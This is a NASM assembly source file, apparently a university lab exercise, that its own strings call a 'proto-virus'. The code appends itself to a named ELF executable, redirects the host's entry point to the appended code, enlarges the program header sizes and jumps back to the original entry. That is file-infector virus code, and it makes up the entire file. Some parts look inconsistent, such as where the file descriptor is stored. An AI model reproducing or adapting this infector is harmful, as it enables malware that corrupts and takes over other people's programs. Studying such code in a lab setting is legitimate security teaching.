%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	STACK_PHDR_OFFSET	124
%define	STACK_BASE_ADDRESS_OFFSET	120
%define	STACK_SIZE_OF_PHDR_OFFSET	112
%define	STACK_SIZE_OF_FILE_OFFSET	116
%define	STACK_ORIGINAL_ENTRY_POINT_OFFSET	108
%define	BUFF_OFFSET	104
%define	BUFF_OFFSET2	200
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define	OFFSET_OF_BUFF	104
%define OFFSET_PHDT 0x1C
%define OFFSET_SIZE_OF_PROGRAM_HEADER_ENTRY 0x2A
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	; CODE_START
	mov edx, FileName
	cmp byte[edx], 'E'
	jne exitting
	cmp byte[edx + 1], 'L'
	jne exitting
	cmp byte[edx + 2], 'F'
	jne exitting

	elfFile:
	; open
	call get_my_loc
	sub edx, next_i-FileName
	mov ecx, 1024 | 1 | 2
	mov ebx, edx
	mov edx, 0777
	open ebx, ecx, edx
	mov esi, eax

	; check for ELF:
	mov ebx, [ebp-4]
	;lea ecx, [ebp-OFFSET_OF_BUFF]
	;read [ebp-4], ecx, 4
	;cmp byte [ebp-103], 'E'
	;JNE exitting
	;cmp byte [ebp-102], 'L'
	;JNE exitting
	;cmp byte [ebp-101], 'F'
	;JNE exitting

	; lseek
	lseek [ebp-4], 0, SEEK_END
	mov [ebp-STACK_SIZE_OF_FILE_OFFSET], eax
	
	; Infect given file
	call get_my_loc
	sub edx, next_i-_start
	mov ecx, edx
	write [ebp-4], ecx, virus_end-_start

	; Copy ELF header
	lseek [ebp-4], 0, SEEK_SET
	lea ecx, [ebp-BUFF_OFFSET]
	read [ebp-4], ecx, 52	
	
	; save entry point
	lea ecx, [ebp-BUFF_OFFSET]
	add ecx, 0x18
	mov eax, [ecx]
	mov [ebp-STACK_ORIGINAL_ENTRY_POINT_OFFSET], eax 
	
	;PreviousEntryPoint	
	lseek [ebp-4], -4, SEEK_END
	lea ecx, [ebp-STACK_ORIGINAL_ENTRY_POINT_OFFSET]
	write [ebp-4], ecx, 4
	
	
	;Read program header
	;read pHdr offset	
	lseek [ebp-4], OFFSET_PHDT, SEEK_SET
	lea ecx, [ebp-STACK_PHDR_OFFSET] 
	read [ebp-4], ecx, 4
	;read pHdr size	
	lseek [ebp-4], OFFSET_SIZE_OF_PROGRAM_HEADER_ENTRY, SEEK_SET
	lea ecx, [ebp-STACK_SIZE_OF_PHDR_OFFSET]
	read [ebp-4], ecx, 1
	;read to buffer
	lseek [ebp-4], [ebp-STACK_PHDR_OFFSET], SEEK_SET
	lea ecx, [ebp-BUFF_OFFSET2]
	mov edx, 0
	mov dl, [ebp-STACK_SIZE_OF_PHDR_OFFSET]
	read [ebp-4], ecx, edx
	
	;get base virtual address
	lea edx, [ebp-BUFF_OFFSET2]
	add edx, PHDR_vaddr
	mov edx, [edx]
	mov [ebp-STACK_BASE_ADDRESS_OFFSET], edx
	
	;change entry point:
	lea ecx, [ebp-BUFF_OFFSET]
	add ecx, 0x18
	mov eax, [ebp-STACK_SIZE_OF_FILE_OFFSET]
	add eax, [ebp-STACK_BASE_ADDRESS_OFFSET] ;add base address to eax
	mov dword [ecx], eax ;new entry point 	
	;Write back the elf header	
	lseek [ebp-4], 0, SEEK_SET
	lea ecx, [ebp-BUFF_OFFSET]
	write [ebp-4], ecx, 52
	
	;change program header:
	mov eax, [ebp-STACK_SIZE_OF_FILE_OFFSET] ;eax holds the original file size
	add eax, virus_end-_start ; eax holds the new file size
	lea ecx, [ebp-BUFF_OFFSET2]
	add ecx, PHDR_filesize
	mov [ecx], eax
	lea ecx, [ebp-BUFF_OFFSET2]
	add ecx, PHDR_memsize
	mov [ecx], eax
	
	;write back the program header:
	lseek [ebp-4], [ebp-STACK_PHDR_OFFSET], SEEK_SET
	lea ecx, [ebp-BUFF_OFFSET2]
	mov edx, 0
	mov dl, [ebp-STACK_SIZE_OF_PHDR_OFFSET]
	write [ebp-4], ecx, edx
	
; You code for this lab goes here
	JMP VirusExit
error:
	call get_my_loc
	sub edx, next_i-PreviousEntryPoint
	mov eax, edx
	
	call get_my_loc
	sub edx, next_i-VirusExit	
	cmp [eax], edx
	JNE go_to_start
	
	call get_my_loc
	sub edx, next_i-text_error
	mov ecx, edx
	write 1, ecx, text_errorLen
	exit 1

exitting:  
VirusExit:	
	call get_my_loc
	sub edx, next_i-PreviousEntryPoint
	mov eax, edx
	call get_my_loc
	sub edx, next_i-VirusExit
	cmp eax, edx
	JE go_to_start
	exit 0            ; Termination if all is OK and no previous code to jump to
	go_to_start:
		JMP [eax]
                         ; (also an example for use of above macros)
	



	
	


	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStrLen: equ $ - OutStr
Failstr:        db "perhaps not", 10 , 0
FailstrLen: equ $ - Failstr

text_error:	db "Error occured!",10,0
text_errorLen equ $-text_error


get_my_loc:
	call next_i
next_i:
	pop edx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


